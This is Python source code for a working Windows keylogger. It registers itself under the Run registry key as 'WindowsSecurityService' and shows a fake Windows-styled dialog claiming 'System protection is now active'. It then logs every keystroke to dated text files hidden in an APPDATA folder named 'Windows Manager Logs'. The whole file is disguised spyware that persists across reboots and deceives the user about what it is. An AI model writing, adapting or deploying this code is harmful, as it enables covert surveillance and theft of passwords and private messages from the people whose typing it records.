import os
import sys
import time
import datetime
import winreg
import threading
import tkinter as tk
from pynput import keyboard

LOG_BASE_DIR = os.path.join(os.environ['APPDATA'], "Windows Manager Logs")
STARTUP_REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
APP_NAME = "WindowsSecurityService"
FLAG_FILE = os.path.join(LOG_BASE_DIR, ".initialized")

_stop = threading.Event()


def get_exe_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(__file__)


def add_to_startup():
    try:
        exe_path = get_exe_path()
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception:
        pass


def ensure_log_dir():
    now = datetime.datetime.now()
    month_dir = os.path.join(LOG_BASE_DIR, str(now.year), now.strftime("%B"))
    os.makedirs(month_dir, exist_ok=True)
    log_file = os.path.join(month_dir, f"{now.strftime('%d-%m-%Y')}.txt")
    if not os.path.exists(log_file):
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write("")
    return month_dir


def get_log_file():
    now = datetime.datetime.now()
    month_dir = ensure_log_dir()
    return os.path.join(month_dir, f"{now.strftime('%d-%m-%Y')}.txt")


def is_first_run():
    return not os.path.exists(FLAG_FILE)


def mark_initialized():
    try:
        os.makedirs(os.path.dirname(FLAG_FILE), exist_ok=True)
        with open(FLAG_FILE, 'w') as f:
            f.write("")
    except Exception:
        pass


def format_key(key):
    try:
        return key.char
    except AttributeError:
        special = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.shift_l: '[SHIFT]',
            keyboard.Key.shift_r: '[SHIFT]',
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.ctrl_l: '[CTRL]',
            keyboard.Key.ctrl_r: '[CTRL]',
            keyboard.Key.alt: '[ALT]',
            keyboard.Key.alt_l: '[ALT]',
            keyboard.Key.alt_r: '[ALT]',
            keyboard.Key.caps_lock: '[CAPSLOCK]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]',
            keyboard.Key.cmd: '[WIN]',
            keyboard.Key.print_screen: '[PRTSC]',
            keyboard.Key.insert: '[INS]',
            keyboard.Key.home: '[HOME]',
            keyboard.Key.end: '[END]',
            keyboard.Key.page_up: '[PGUP]',
            keyboard.Key.page_down: '[PGDN]',
            keyboard.Key.f1: '[F1]', keyboard.Key.f2: '[F2]', keyboard.Key.f3: '[F3]',
            keyboard.Key.f4: '[F4]', keyboard.Key.f5: '[F5]', keyboard.Key.f6: '[F6]',
            keyboard.Key.f7: '[F7]', keyboard.Key.f8: '[F8]', keyboard.Key.f9: '[F9]',
            keyboard.Key.f10: '[F10]', keyboard.Key.f11: '[F11]', keyboard.Key.f12: '[F12]',
            keyboard.Key.num_lock: '[NUMLOCK]',
            keyboard.Key.scroll_lock: '[SCROLLLOCK]',
        }
        return special.get(key, f'[{key.name.upper()}]')


def on_key_press(key):
    try:
        with open(get_log_file(), 'a', encoding='utf-8') as f:
            f.write(format_key(key))
    except Exception:
        pass


def show_gui():
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)

    w, h = 420, 260
    sx = root.winfo_screenwidth() // 2 - w // 2
    sy = root.winfo_screenheight() // 2 - h // 2
    root.geometry(f"{w}x{h}+{sx}+{sy}")
    root.configure(bg="#f0f0f0")
    root.resizable(False, False)

    title_bar = tk.Frame(root, bg="#0078d4", height=36)
    title_bar.pack(fill=tk.X)
    title_bar.pack_propagate(False)

    tk.Label(title_bar, text="WindowsManager", bg="#0078d4", fg="white",
             font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=12, pady=8)

    def close_app(event=None):
        root.destroy()

    close_btn = tk.Label(title_bar, text="\u2715", bg="#0078d4", fg="white",
                         font=("Segoe UI", 11, "bold"), cursor="hand2")
    close_btn.pack(side=tk.RIGHT, padx=12)
    close_btn.bind("<Button-1>", close_app)

    body = tk.Frame(root, bg="#f0f0f0")
    body.pack(expand=True, fill=tk.BOTH, padx=30, pady=20)

    tk.Label(body, text="\u2714", bg="#f0f0f0", fg="#28a745",
             font=("Segoe UI", 32, "bold")).pack(pady=(0, 8))

    tk.Label(body, text="WindowsManager", bg="#f0f0f0", fg="#333333",
             font=("Segoe UI", 13, "bold")).pack()

    tk.Label(body, text="has been enabled successfully.\nSystem protection is now active.",
             bg="#f0f0f0", fg="#666666",
             font=("Segoe UI", 9), justify=tk.CENTER).pack(pady=(6, 14))

    close_button = tk.Button(body, text="Close", command=root.destroy,
                             bg="#0078d4", fg="white", font=("Segoe UI", 10, "bold"),
                             relief=tk.FLAT, cursor="hand2", padx=30, pady=6)
    close_button.pack()

    root.mainloop()


def main():
    add_to_startup()
    ensure_log_dir()

    if is_first_run():
        show_gui()
        mark_initialized()

    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    _stop.wait()


if __name__ == "__main__":
    main()
